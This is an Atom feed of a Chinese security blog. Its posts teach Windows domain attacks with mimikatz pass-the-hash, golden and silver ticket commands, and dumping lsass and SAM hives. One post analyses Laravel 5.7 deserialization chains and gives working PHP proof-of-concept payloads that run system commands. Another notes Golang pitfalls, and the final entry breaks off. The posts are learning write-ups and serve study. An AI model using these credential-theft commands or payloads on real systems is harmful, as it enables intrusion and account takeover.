<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://chriskalix.github.io</id>
    <title>chriskali&apos;s blog</title>
    <updated>2020-06-26T09:06:40.979Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://chriskalix.github.io"/>
    <link rel="self" href="https://chriskalix.github.io/atom.xml"/>
    <subtitle>Keep learning</subtitle>
    <logo>https://chriskalix.github.io/images/avatar.png</logo>
    <icon>https://chriskalix.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, chriskali&apos;s blog</rights>
    <entry>
        <title type="html"><![CDATA[域渗透基础知识(二)-PTH&PTT]]></title>
        <id>https://chriskalix.github.io/post/hPs3dwq1p/</id>
        <link href="https://chriskalix.github.io/post/hPs3dwq1p/">
        </link>
        <updated>2020-06-26T08:16:51.000Z</updated>
        <content type="html"><![CDATA[<h2 id="pth">PTH</h2>
<blockquote>
<p>内网中，经常需要抓取管理员密码(NTLM Hash)。PTH是一种不需要账户明文密码就能完成认证的一个技术。尤其是在域环境下，能帮助我们扩大战果</p>
</blockquote>
<h3 id="必须条件">必须条件</h3>
<ol>
<li>网络互达(这个有点多余，不互达怎么做)</li>
<li>需要用户名</li>
<li>需要NTLM Hash</li>
</ol>
<p>问题1：为什么需要用户名？<br>
答案：看一下NTLM协议，第一步就是传输用户名</p>
<p>问题2：如何使用NTLMv1/NTLMv2或者net NTLM进行HASH传递攻击？<br>
答案：这些都不行，只有NTLM Hash</p>
<h3 id="通常pth的渗透方式">通常PTH的渗透方式</h3>
<ul>
<li>获取一台域内主机的权限</li>
<li>Dump内存获取用户HASH</li>
<li>通过PTH尝试登录其他主机</li>
<li>继续收集HASH并尝试远程登录</li>
<li>直到获取域管理员HASH，最终成果控制整个域</li>
</ul>
<h3 id="现实情况">现实情况</h3>
<blockquote>
<p>会有补丁，策略等等，以下列出两种</p>
</blockquote>
<h4 id="对抗补丁">对抗补丁</h4>
<p>KB2871997（被称为PTH杀手），是微软在2014年5月13号推出的补丁，当时的标题为&quot;Update to fix the Pass-The-Hash Vulnerability&quot;，一周后改为&quot;Update to improve credentials protection and management&quot;<br>
使得本地账号不能再用于远程接入系统，这样就无法以本地管理员用户执行wmi、PSEXEC、schtasks、at和文件访问。然而，administrator用户仍能够PTH，这里是SID为500的用户，默认名为administrator，即使改名了，SID还是不会改变<br>
所以从防御视角来说，即使打了补丁，还要禁用SID=500的管理员用户</p>
<h4 id="laps">LAPS</h4>
<p>LAPS即Local Administrator Password Solution，是微软推出的本地密码管理方案。解决了域内主机本地管理员密码相同的问题。</p>
<h3 id="操作命令">操作命令</h3>
<blockquote>
<p>这里其实本地搭建一个域环境会理解的比较深刻，我之前搭建了，系统重装后忘记保存，暂时没有</p>
</blockquote>
<h4 id="使用ntlm-hash进行pth攻击">使用NTLM Hash进行PTH攻击</h4>
<blockquote>
<p>此方法在KB2871997后收到限制，只能用SID=500的账户进行PTH操作</p>
</blockquote>
<p><code>mimikatz &quot;privileges::debug&quot; &quot;&quot;sekurlsa::pth /user:administrator /domain::pentest.com /ntlm:xxxxx</code></p>
<h4 id="aes-256进行pth攻击ptk">AES-256进行PTH攻击(PTK)</h4>
<blockquote>
<p>此方法针对的是打上了KB2871997的机器（猜测就是为啥微软一周后就改名了），又叫<code>Pass The Key</code></p>
</blockquote>
<ol>
<li>mimikatz抓取AES-256密钥<br>
<code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot;</code></li>
<li><code>mimikatz &quot;privileges::debug&quot; &quot;&quot;sekurlsa::pth /user:administrator /domain::pentest.com /aes256:xxxxx</code></li>
</ol>
<h3 id="pth的其他场景">PTH的其他场景</h3>
<p>在<a href="https://www.secpulse.com/archives/105503.html">这篇文章</a>中我看到了其他场景。Restricted Admin Mode，开启这个模式后，默认可以用凭证登录</p>
<p><code>privilege::debug sekurlsa::pth /user:administrator /domain:remoteserver /ntlm:d25ecd13fddbb542d2e16da4f9e0333d &quot;/run:mstsc.exe /restrictedadmin&quot;</code></p>
<h2 id="ptt">PTT</h2>
<blockquote>
<p>PTT，Pass The Ticket即票据传递攻击。<br>
cs中<br>
<code>kerberos_ccache_use 从ccache文件中导入票据应用于此会话 kerberos_ticket_purge 清除当前会话的票据 kerberos_ticket_use 从ticket文件中导入票据应用于此会话</code></p>
</blockquote>
<h3 id="golden-ticket黄金票据">Golden Ticket黄金票据</h3>
<blockquote>
<p>该票据的利用条件是原先已成功取得域用户(krbtgt)的HASH这个用户的。由于某些原因导致在控域网络失控，失去域管理员权限。现在你还有一个普通域用户权限，管理员在加固时没有重置krbtgt密码（非常常见），在此条件下，我们还能利用该票据重新获得域管理员权限</p>
</blockquote>
<p>相当于可以自己造TGT</p>
<h4 id="前提条件">前提条件</h4>
<ul>
<li>域名称</li>
<li>域SID</li>
<li>域krbtgt的hash（意味着你已经有域控权限）</li>
<li>伪造的用户名（任意用户或者不存在的用户）</li>
</ul>
<h4 id="具体操作">具体操作</h4>
<ol>
<li>
<p>提取域用户kgbtgt的NTLM Hash<br>
<code>lsadump::dcsync /domain:hacker.com /user:krbtgt</code>或者上个文章提到的方法</p>
</li>
<li>
<p>查看域内所有用户的hash<br>
<code>lsadump::dcsync /domain:yangdc.com /all /csv</code></p>
</li>
<li>
<p>获取域SID<br>
<code>whoami /all</code></p>
</li>
<li>
<p>生成票据<br>
方法1： AES256</p>
<p><code>kerber::golden /domain:{域名称} /sid:{sid} /aes256:{AES-256_hmac} /user:{伪造的用户名} /ticket:{名称}.kribi</code></p>
<p>方法2：NTLM Hash</p>
<p><code>kerber::golden /domain:{域名称} /sid:{sid} /rc4:ntlm-hashvlaue /user:{伪造的用户名} /ticket:{名称}.kribi</code></p>
<p><code>mimikatz &quot;kerberos::golden /domain:{域名} /sid:{域SID} /rc4:{KRBTGT NTLM Hash} /user:{任意用户} /ptt&quot; exit</code></p>
</li>
</ol>
<h4 id="防御">防御</h4>
<ol>
<li>经常更换KRBTGT密码</li>
<li>不允许域管账户登录其他服务器</li>
</ol>
<h3 id="silver-ticket白银票据">Silver Ticket白银票据</h3>
<blockquote>
<p>白银票据(Silver Tickets)是伪造Kerberos票证授予服务（TGS）的票也称为服务票据。所以没有与域控制器通信</p>
</blockquote>
<h4 id="前提条件-2">前提条件</h4>
<ul>
<li>域名称</li>
<li>域的SID</li>
<li>域中Server服务器账户的NTLM-Hash</li>
<li>伪造任意的用户名</li>
</ul>
<h4 id="具体操作-2">具体操作</h4>
<ol>
<li>导出hash<br>
<code>mimikatz log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;</code></li>
<li>生成ticket<br>
<code>mimikatz &quot;kerberos::golden /domain:{域名} /sid:{域SID} /target:{目标服务器主机名} /service:{服务类型} /rc4:{NTLM Hash} /user:{用户名} /ptt&quot; exit Silver Ticket 生成时指定了相关的服务名，因此只能用来访问相对应的服务，因此局限性比较大</code></li>
</ol>
<h4 id="防御-2">防御</h4>
<p>PAC</p>
<h2 id="参考文章">参考文章</h2>
<p><a href="http://www.vuln.cn/6813">乌云文章</a><br>
<a href="https://xz.aliyun.com/t/7051">先知文章</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[域渗透基础知识(一)-Windows认证]]></title>
        <id>https://chriskalix.github.io/post/e3nr4E66U/</id>
        <link href="https://chriskalix.github.io/post/e3nr4E66U/">
        </link>
        <updated>2020-06-26T08:14:38.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>主要包含本地认证，网络认证，域认证</p>
</blockquote>
<h2 id="windows本地认证">Windows本地认证</h2>
<p>简述流程：当登录系统时候，用户的密码会被加密成NTLM Hash，再通过与SAM数据库中用户的哈希（<code>%SystemRoot%\system32\config\sam</code>）进行匹配从而完成校验。</p>
<h3 id="认证流程">认证流程</h3>
<p>简易图：<br>
<img src="https://chriskalix.github.io/post-images/1593159324969.png" alt="" loading="lazy"></p>
<p>提到的<strong>NTLM Hash</strong>，是一种单向哈希算法。顺便记一下，Windows中不以明文形式进行传输和存储。算法的流程如下：</p>
<p><code>hex编码 -&gt; Unicode编码 -&gt; MD4</code></p>
<p>简单地用py做个HASH：</p>
<figure data-type="image" tabindex="1"><img src="https://chriskalix.github.io/post-images/1593159333529.png" alt="" loading="lazy"></figure>
<blockquote>
<p><code>NTLM Hash</code>的前身为<code>LM Hash</code>，存在于<code>Windows Server 2008</code>之前版本，由于安全性被淘汰</p>
</blockquote>
<p>经常我们听到用mimikatz抓密码这个操作，其实就是从<code>lsass.exe</code>这个进程中读取到的</p>
<h3 id="抓取密码">抓取密码</h3>
<blockquote>
<p>这一过程需要system，毕竟访问的是<code>lsass.exe</code></p>
</blockquote>
<h4 id="用procdump-mimikatz">用Procdump + Mimikatz</h4>
<p>mimikatz都听过，但是不做免杀就是冲锋兵，没落地就被吃了。那怎么办，可以用微软自带的<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">Procdump</a>，命令如下：<br>
<code>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</code><br>
然后再脱到本地，用<code>mimikatz</code>跑一下<br>
<code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</code></p>
<h4 id="无工具直接抓取">无工具直接抓取</h4>
<p>直接通过reg的save选项保存<br>
<code>reg save hklm\sam sam.hive</code><br>
<code>reg save hklm\system system.hive</code></p>
<p>然后拖到本地，mimikatz跑<br>
<code>lsadump::sam /sam:sam.hive /system:system.hive</code></p>
<p>问题：为什么有时候看到能抓明文，有时候又是抓NTLM Hash？</p>
<p>答案：默认Win10或者win server 2012r2以上的，禁止在内存中保存明文密码(WDigest策略)，所以有时候需要明文密码的时候，就需要Hook winlogon程序，然后开启WDigest等待对方登录。</p>
<h2 id="windows网络认证">Windows网络认证</h2>
<p>工作组环境下远程登录另外一台设备所采用的认证机制。常见的如SMB</p>
<h3 id="ntlm协议">NTLM协议</h3>
<p>分为三步骤</p>
<ol>
<li>协商</li>
<li>质询</li>
<li>验证</li>
</ol>
<h4 id="1-协商">1. 协商</h4>
<p>协商认证版本（NTLM v1/NTLM v2）</p>
<h4 id="2-质询">2. <strong>质询</strong></h4>
<p>**挑战（Chalenge）/响应（Response）**认证机制。步骤如下：</p>
<ol>
<li>客户端向服务端发送用户信息（用户名）请求</li>
<li>服务端接受到请求，生成一个16位的随机数，成为&quot;Challenge&quot;，服务端查询用户名所对应的NTLM Hash，用该哈希加密&quot;Challeng&quot;，保存至内存中，称之为&quot;Challeng1&quot;，之后再将&quot;Challenge&quot;发送至客户端</li>
<li>客户端收到&quot;Chanlleng&quot;后，同样的使用自己的NTLM Hash，对&quot;Challenge&quot;进行加密比对，生成Response传递给客户端</li>
</ol>
<p>其中NTLM Hash加密Challenge的结果，在协议中称为Net NTLM Hash</p>
<h4 id="3-验证">3. 验证</h4>
<p>客户端收到上述的Response，与内存中的Chanllenge1进行比对，完成验证</p>
<h2 id="域认证kerberos">域认证（Kerberos）</h2>
<p>Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的密码技术（如：共享密钥）执行认证服务的。</p>
<p>域认证所包含的角色有：</p>
<ul>
<li>Client</li>
<li>Server</li>
<li>KDC(Key Distribution Centor) = DC</li>
</ul>
<h3 id="详细流程">详细流程</h3>
<p>流程图如下所示：<br>
<img src="https://chriskalix.github.io/post-images/1593159403049.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Laravel 5.7.x反序列化链分析]]></title>
        <id>https://chriskalix.github.io/post/xpSoAzZun/</id>
        <link href="https://chriskalix.github.io/post/xpSoAzZun/">
        </link>
        <updated>2020-06-26T08:02:56.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>前段时间电脑重装后忘记备份了，从环境开始</p>
</blockquote>
<h2 id="环境预备">环境预备</h2>
<h3 id="准备工具">准备工具</h3>
<ol>
<li>PHPStudy - PHP 7.1.9</li>
<li>composer</li>
<li>VSCODE(调试)</li>
</ol>
<h3 id="安装">安装</h3>
<ol>
<li>设置源 ：<code>composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/</code></li>
<li>安装Laravel ：<code>composer create-project laravel/laravel Laravel --prefer-dist &quot;5.7.*&quot;</code></li>
</ol>
<h2 id="开始调试">开始调试</h2>
<blockquote>
<p>比赛前没有看过Laravel框架，比赛的时候很慌乱，到处找链，发现入口点都是一样的，但是被堵死了</p>
</blockquote>
<h3 id="laravel-57x反序列化链一">Laravel 5.7.x反序列化链(一)</h3>
<h4 id="设置反序列化入口点">设置反序列化入口点</h4>
<p>先往<code>app/Http/Controllers/</code>下添加<code>TaskController.php</code>文件，内容为</p>
<pre><code class="language-php">&lt;?php
namespace App\Http\Controllers;
class TaskController 
{ 
public function index(){
    if(isset($_GET['p'])){
        unserialize($_GET['p']);    
    } 
    return &quot;There is an param names p (get)&quot;; 
    } 
} 
?&gt;
</code></pre>
<p>在<code>routes/web.php</code>下添加路由</p>
<pre><code class="language-php">Route::get('/index', 'TaskController@index');
</code></pre>
<p>访问<code>localhost/Laravel/public/index</code>，返回<code>There is an param names p (get)</code>证明成功</p>
<h4 id="反序列化入口点">反序列化入口点</h4>
<p>网上能找到的，如<code>CVE-2019-9081</code>，大多反序列的入口点为<code>vendor/laravel/framework/src/illuminate/Foundation/Testing/PendingCommand.php</code>，中的<code>PendingCommand</code>类，提取出相关的函数点，如下：</p>
<pre><code class="language-php">class PendingCommand
{
	public $test;
	protected $app;
	protected $command;
	protected $parameters;
	protected $expectedExitCode;
	protected $hasExecuted = false;
	...
    public function run()
    {
    	...
    }
    ...
    public function __destruct()
    {
        if ($this-&gt;hasExecuted) {
            return;
        }

        $this-&gt;run();
    }
}
</code></pre>
<h4 id="继续跟进">继续跟进</h4>
<p>默认调用了<code>$this-&gt;run()</code>，继续跟进<code>run()</code>下的代码</p>
<pre><code class="language-php">    /**
     * Execute the command.
     *
     * @return int
    */
   public function run()
    {
        $this-&gt;hasExecuted = true;
        $this-&gt;mockConsoleOutput();
        try {
            $exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);
        } catch (NoMatchingExpectationException $e) {
            if ($e-&gt;getMethodName() === 'askQuestion') {
                $this-&gt;test-&gt;fail('Unexpected question &quot;'.$e-&gt;getActualArguments()[0]-&gt;getQuestion().'&quot; was asked.');
            }
            throw $e;
        }
        if ($this-&gt;expectedExitCode !== null) {
            $this-&gt;test-&gt;assertEquals(
                $this-&gt;expectedExitCode, $exitCode,
                &quot;Expected status code {$this-&gt;expectedExitCode} but received {$exitCode}.&quot;
            );
        }
        return $exitCode;
    }
</code></pre>
<p>为什么看到<code>run</code>方法比较兴奋，因为上面注释写着<code>execute the command</code>，一看就是有执行的样子。但是先调用了该类的<code>mockConsoleOutput</code>方法，继续跟进查看，这边构造的时候注意<code>$app</code>的类问题，在该文件中有注释<code>* @param \Illuminate\Foundation\Application $app</code>。该类在文件<code>vendor/laravel/framework/src/illuminate/Foundation/Application.php</code>下</p>
<pre><code class="language-php">protected function mockConsoleOutput()
{
    $mock = Mockery::mock(OutputStyle::class.'[askQuestion]', [
        (new ArrayInput($this-&gt;parameters)), $this-&gt;createABufferedOutputMock(),
    ]);

    foreach ($this-&gt;test-&gt;expectedQuestions as $i =&gt; $question) {
        $mock-&gt;shouldReceive('askQuestion')
            -&gt;once()
            -&gt;ordered()
            -&gt;with(Mockery::on(function ($argument) use ($question) {
                return $argument-&gt;getQuestion() == $question[0];
            }))
            -&gt;andReturnUsing(function () use ($question, $i) {
                unset($this-&gt;test-&gt;expectedQuestions[$i]);

                return $question[1];
            });
    }

    $this-&gt;app-&gt;bind(OutputStyle::class, function () use ($mock) {
        return $mock;
    });
}
</code></pre>
<p>看到<code>foreach</code>那行，因为<code>test</code>可控，所以该函数可以调用任意类下的<code>__get</code>。全局搜索，还是有挺多的，网上的文章不同的大部分在这里开支，有使用<code>Illuminate\Auth\GenericUser</code>类的，也有使用<code>Faker\DefaultGenerator</code>类的。这边挑取<code>Faker\DefaultGenerator</code>进行跟进分析</p>
<h4 id="链子1">链子1</h4>
<p>找到文件<code>vendor/fzaninotto/faker/src/Faker/DefaultGenerator.php</code>，如下：</p>
<pre><code class="language-php">class DefaultGenerator
{
    protected $default;

    public function __construct($default = null)
    {
        $this-&gt;default = $default;
    }
    public function __get($attribute)
    {
        return $this-&gt;default;
    }
    public function __call($method, $attributes)
    {
        return $this-&gt;default;
    }
}

</code></pre>
<p>跟先知文章走，到这里先自己构造一遍</p>
<pre><code class="language-php">&lt;?php

namespace Illuminate\Foundation\Testing {
	class PendingCommand {
		public $test;
		protected $app;
		protected $command;
		protected $parameters;

		public function __construct($test,$app,$command,$parameters) {
			$this-&gt;test = $test;
			$this-&gt;app = $app;
			$this-&gt;command = $command;
			$this-&gt;parameters = $parameters;
		}
	}
}

namespace Faker {
	class DefaultGenerator {
		protected $default;
		public function __construct($default = null) {
			$this-&gt;default = $default;
		}
	}
}

namespace Illuminate\Foundation {
	class Application {
		public function __construct() {
		}
	}
}

namespace {
	$c = new Faker\DefaultGenerator(array(&quot;1&quot;=&gt;&quot;1&quot;));
	$b = new Illuminate\Foundation\Application();
	$a = new Illuminate\Foundation\Testing\PendingCommand($c, $b, 'system', array('whoami'));
	echo urlencode(serialize($a));
}
</code></pre>
<p>给<code>PendingCommand</code>传的不是array，会报如下错误<br>
<img src="https://chriskalix.github.io/post-images/1593158937485.png" alt="" loading="lazy"></p>
<h4 id="关键函数">关键函数</h4>
<p>继续跟进到</p>
<pre><code class="language-php">$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);
</code></pre>
<p>这时候需要认真看，因为调到这里的时候报错了。首先先看一下app是什么，在代码里的注释有，如下：</p>
<pre><code class="language-php">/**
 * The application instance.
 *
 * @var \Illuminate\Foundation\Application
 */
protected $app;
</code></pre>
<p>其实就是<code>\Illuminate\Foundation\Application</code>下的类，<code>Kernel::class</code>其实就是字符串<code>Illuminate\Contracts\Console\Kernel</code>，这里讲起来比较绕，直接上图。</p>
<figure data-type="image" tabindex="1"><img src="https://chriskalix.github.io/post-images/1593158913879.png" alt="" loading="lazy"></figure>
<pre><code class="language-php">&lt;?php

namespace Illuminate\Foundation\Testing {
	class PendingCommand {
		public $test;
		protected $app;
		protected $command;
		protected $parameters;

		public function __construct($test,$app,$command,$parameters) {
			$this-&gt;test = $test;
			$this-&gt;app = $app;
			$this-&gt;command = $command;
			$this-&gt;parameters = $parameters;
		}
	}
}

namespace Faker {
	class DefaultGenerator {
		protected $default;
		public function __construct($default = null) {
			$this-&gt;default = $default;
		}
	}
}

namespace Illuminate\Foundation{
    class Application{
        protected $instances = [];
        public function __construct($instances = [])
        {
            $this-&gt;instances['Illuminate\Contracts\Console\Kernel'] = $instances;
        }
    }
}

namespace {
	$d = new Faker\DefaultGenerator(array(&quot;1&quot;=&gt;&quot;1&quot;));
	$c = new Illuminate\Foundation\Application();
	$b = new Illuminate\Foundation\Application($c);
	$a = new Illuminate\Foundation\Testing\PendingCommand($d, $b, 'system', array('whoami'));
	echo urlencode(serialize($a));
}
</code></pre>
<p>最后POC如上，就是和先知那个文章一样了，照着跟的，不过这个CVE其实有版本限制</p>
<h3 id="laravel反序列化链二">Laravel反序列化链（二）</h3>
<blockquote>
<p>这个链子是群里奶权师傅的0day，链子十分神奇，属实太强了。不是我的不是我的不是我的，是奶权的，是奶权的，是奶权的。</p>
</blockquote>
<h4 id="反序列化入口点-2">反序列化入口点</h4>
<p>入口点文件在<code>vendor/swiftmailer/swiftmailer/lib/classes/Swift/ByteSteam/TemporaryFileByteStream.php</code>的<code>Swift_ByteStream_TemporaryFileByteStream</code>类</p>
<figure data-type="image" tabindex="2"><img src="https://chriskalix.github.io/post-images/1593158964510.png" alt="" loading="lazy"></figure>
<p>跟到<code>vendor/swiftmailer/swiftmailer/lib/classes/Swift/ByteStream/FileByteStream.php</code>的<code>Swift_ByteStream_FileByteStream</code>下的<code>getpath()</code></p>
<pre><code class="language-php">public function getPath()
{
    return $this-&gt;path;
}
</code></pre>
<p>这里可控，且<code>file_exists</code>所以触发任意类的 <code>__toString()</code></p>
<h4 id="继续跟进-2">继续跟进</h4>
<p><code>vendor/laravel/framework/src/Illuminate/View/View.php</code> 下的<code>__toString()</code></p>
<pre><code class="language-php">public function __toString()
{
    return $this-&gt;render();
}
</code></pre>
<p>跟到<code>render</code>函数</p>
<pre><code class="language-php">public function render(callable $callback = null)
{
    try {
        $contents = $this-&gt;renderContents();

        $response = isset($callback) ? call_user_func($callback, $this, $contents) : null;

        // Once we have the contents of the view, we will flush the sections if we are
        // done rendering all views so that there is nothing left hanging over when
        // another view gets rendered in the future by the application developer.
        $this-&gt;factory-&gt;flushStateIfDoneRendering();

        return ! is_null($response) ? $response : $contents;
    } catch (Exception $e) {
        $this-&gt;factory-&gt;flushState();

        throw $e;
    } catch (Throwable $e) {
        $this-&gt;factory-&gt;flushState();

        throw $e;
    }
}
</code></pre>
<p>虽然<code>try</code>出现了<code>call_user_func</code>，但是<code>$callback</code>是空的，可以看到<code>$this-&gt;factory-&gt;flushStateIfDoneRendering();</code> 是可控的，可以触发任意类 <code>__call()</code>，作为跳板继续跟进。在<code>vendor/fzaninotto/faker/src/Faker/Generator.php</code>下</p>
<pre><code class="language-php">public function __call($method, $attributes)
{
    return $this-&gt;format($method, $attributes);
}
</code></pre>
<p>继续跟进</p>
<pre><code class="language-php">public function format($formatter, $arguments = array())
{
    return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);
}
</code></pre>
<p>这里只有<code>$formatter</code>是可控的，跟进<code>getFormatter</code>，得到如下</p>
<pre><code class="language-php">public function getFormatter($formatter)
{
    if (isset($this-&gt;formatters[$formatter])) {
        return $this-&gt;formatters[$formatter];
    }
    foreach ($this-&gt;providers as $provider) {
        if (method_exists($provider, $formatter)) {
            $this-&gt;formatters[$formatter] = array($provider, $formatter);

            return $this-&gt;formatters[$formatter];
        }
    }
    throw new \InvalidArgumentException(sprintf('Unknown formatter &quot;%s&quot;', $formatter));
}
</code></pre>
<p><code>getformatter</code>中的<code>return $this-&gt;formatters[$formatter]</code>，因为<code>$formatters</code>与<code>$formatter</code>均可控，所以这里调用任意类的任意方法，但是由于<code>format</code>方法中的<code>$arguements</code>为空，不能对函数进行传参</p>
<h4 id="执行点">执行点</h4>
<blockquote>
<p>这个地方我觉得是最神奇的，我看着poc写分析过程的时候到这有点卡住了。后来看了奶权师傅的分析文章才明白，这个地方确实很神奇</p>
</blockquote>
<p>可用函数点为<code>/vendor/fzaninotto/faker/src/Faker/VaildGenerator.php</code>下的<code>__call</code>函数中，如下：</p>
<pre><code class="language-php">public function __call($name, $arguments)
{
    $i = 0;
    do {
        $res = call_user_func_array(array($this-&gt;generator, $name), $arguments);
        $i++;
        if ($i &gt; $this-&gt;maxRetries) {
            throw new \OverflowException(sprintf('Maximum retries of %d reached without finding a valid value', $this-&gt;maxRetries));
        }
    } while (!call_user_func($this-&gt;validator, $res));

    return $res;
}
</code></pre>
<p>首先<code>$res = call_user_func_array(array($this-&gt;generator, $name), $arguments);</code>获取<code>$res</code>返回值，然后走到<code>while</code>里的<code>call_user_func</code>进行执行，do while会先进去，再到while分支的，继续寻找能控制返回值的（且不需要输入参数）的函数。</p>
<p>在<code>vendor/phpunit/php-token-stream/src/Token/Stream.php</code> 中找到</p>
<pre><code class="language-php">public function getFilename()
{
    return $this-&gt;filename;
}
</code></pre>
<p>那么到这里利用链就分析完毕，这里写上POC，POC也是看着奶权写的，都是奶哥的，我负责复现5555555</p>
<pre><code class="language-php">&lt;?php
namespace {
    class PHP_Token_Stream {
        protected $filename;
        public function __construct() {
            $this-&gt;filename = &quot;whoami&quot;;
        }
    }
}

namespace Faker {
    use PHP_Token_Stream;
    class ValidGenerator {
        protected $generator;
        protected $validator; // while (!call_user_func($this-&gt;validator, $res));
        protected $maxRetries; // if ($i &gt; $this-&gt;maxRetries)执行一次，所以设定为2就行
        public function __construct() {
            $this-&gt;generator = new PHP_Token_Stream;
            $this-&gt;validator = &quot;system&quot;;
            $this-&gt;maxRetries = 2;
        }
    }
    class Generator {
        protected $formatters = array();
        public function __construct() {
            $this-&gt;formatters['flushState'] = [new ValidGenerator, &quot;getFilename&quot;];
        }
    }
}

namespace Illuminate\View {
    use Faker\Generator;
    class View {
        protected $factory;
        public function __construct() {
            $this-&gt;factory = new Generator;
        }
    }
}

namespace {
    use Illuminate\View\View;
    class Swift_ByteStream_FileByteStream {
        private $path;
        public function __construct() {
            $this-&gt;path = new View;
        }
    }

    class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream {
    }

    $a = new Swift_ByteStream_TemporaryFileByteStream;
    echo urlencode(serialize(new Swift_ByteStream_TemporaryFileByteStream));
}
</code></pre>
<h4 id="反序列化链三">反序列化链（三）</h4>
<p>这里就不继续分析了，换了一个入口点进入<code>run()</code>，比赛的时候没注意哈哈哈，老老实实地复现跟踪</p>
<pre><code class="language-php">&lt;?php
//gadgets.php
namespace Illuminate\Foundation\Testing{
    class PendingCommand{
        protected $command;
        protected $parameters;
        protected $app;
        public $test;


        public function __construct($command, $parameters,$class,$app)
{
            $this-&gt;command = $command;
            $this-&gt;parameters = $parameters;
            $this-&gt;test=$class;
            $this-&gt;app=$app;
        }
    }
}


namespace Illuminate\Auth{
    class GenericUser{
        protected $attributes;
        public function __construct(array $attributes){
            $this-&gt;attributes = $attributes;
        }
    }
}




namespace Illuminate\Foundation{
    class Application{
        protected $hasBeenBootstrapped = false;
        protected $bindings;


        public function __construct($bind){
            $this-&gt;bindings=$bind;
        }
    }
}


namespace Symfony\Component\Routing\Loader\Configurator{
    class CollectionConfigurator
    {
        public $parent;
        public $collection;
        public $prefixes;


        public function __construct($parent)
{
            $this-&gt;prefixes=1;
            $this-&gt;parent=$parent;
            $this-&gt;collection=new \Symfony\Component\Routing\RouteCollection(array(&quot;12end&quot;=&gt;&quot;12end&quot;));
        }
    }
}


namespace Faker{
    class ValidGenerator
    {
        protected $generator;
        protected $validator;
        protected $maxRetries;


        public function __construct($validator)
{
            $this-&gt;generator = new \Symfony\Component\Routing\RouteCollection(array(&quot;12end&quot;=&gt;&quot;12end&quot;));
            $this-&gt;validator = $validator;
            $this-&gt;maxRetries = 10;
        }
    }
}


namespace Symfony\Component\Routing{
    class RouteCollection{


    }
}
?&gt;
</code></pre>
<h2 id="参考">参考</h2>
<p><a href="https://xz.aliyun.com/t/5483">先知文章-反序列化链1</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Golang踩坑集锦]]></title>
        <id>https://chriskalix.github.io/post/DRstRdo9d/</id>
        <link href="https://chriskalix.github.io/post/DRstRdo9d/">
        </link>
        <updated>2020-06-21T13:47:26.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>写<code>Golang</code>踩了一些坑，大部分的坑都是比较睿智的。因为不想看视频文档之类的，基础语法学了就上路了，有点磕磕绊绊，记录一下踩到的坑，防止反复地踩。总之，不断更新记录吧。</p>
</blockquote>
<h2 id="变量申明以及作用域">变量申明以及作用域</h2>
<blockquote>
<p>起因，写了一个channel，明明是非阻塞的啊，结果阻塞了，具体如下</p>
</blockquote>
<pre><code class="language-go">package xxx

var ipch chan string
func a() {
	ipch := make(chan string, 10000)
	xxx
	go b()
}

func b() {
	ipch &lt;- &quot;test&quot;
}

</code></pre>
<p>当时那叫一个纳闷，想不明白为什么<code>ipch &lt;- &quot;test&quot;</code>就阻塞了，没办法把chan写到a函数内部去，然后当参数传给b（也不是不行）。还是纳闷，于是去搜一下，发现有人踩过坑了（<a href="https://www.cnblogs.com/sevenyuan/p/4544434.html">文章</a>）。<br>
其实就是变量和作用域的问题，用 := 相当于另外申明，去了<code>:</code> 就行了 （...原来这么睿智）</p>
<h2 id="动态调用">动态调用</h2>
<p>一直以为应该能有一个类似于<code>php</code>中<code>call_user_func</code>的函数，直接根据函数名调用。昨晚(20200621)看到了凌晨2点，在<code>stackoverflow</code>上找到一个老兄的回答，说是只能自定一个map，然后用reflect函数做个动态调用的。哭了，我以为只能直接的。</p>
<h2 id="不知名小坑集合">不知名小坑集合</h2>
<ol>
<li>
<p><code>time.Sleep(1 * time.Second)</code>可以，但是定义一个<code>int a</code>，然后<code>time.Sleep(a * time.Second)</code>就会报错，这是因为俩类型不一样，改成<code>time.Sleep(time.Duration(a) * time.Second)</code>就可以</p>
</li>
<li>
<p>循环发送udp，发到1000个左右的时候就报错 <code>bad file description</code>，<code>fd</code>相关的错误。看了一下<code>ulimit</code>的都没什么问题。查阅后发现，是因为我写的时候调用了<code>syscall.send</code>，打开了<code>fd</code>，但是没有调用<code>syscall.Close(fd)</code>导致堆积阻塞，出现这一问题的原因是我以为函数return后，应该会自动回收<code>fd</code>，然而事实不是这样的（这个应该算是<code>Linux</code>编程问题吧）</p>
</li>
</ol>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Windows认证&Kerberos&常见攻击]]></title>
        <id>https://chriskalix.github.io/post/SXS4qCdRk/</id>
        <link href="https://chriskalix.github.io/post/SXS4qCdRk/">
        </link>
        <updated>2020-06-17T06:58:22.000Z</updated>
        <content type="html"><![CDATA[<h2 id="1-windows本地认证">1. Windows本地认证</h2>
<ul>
<li>路径：<code>%SystemRoot%\system32\config\sam</code></li>
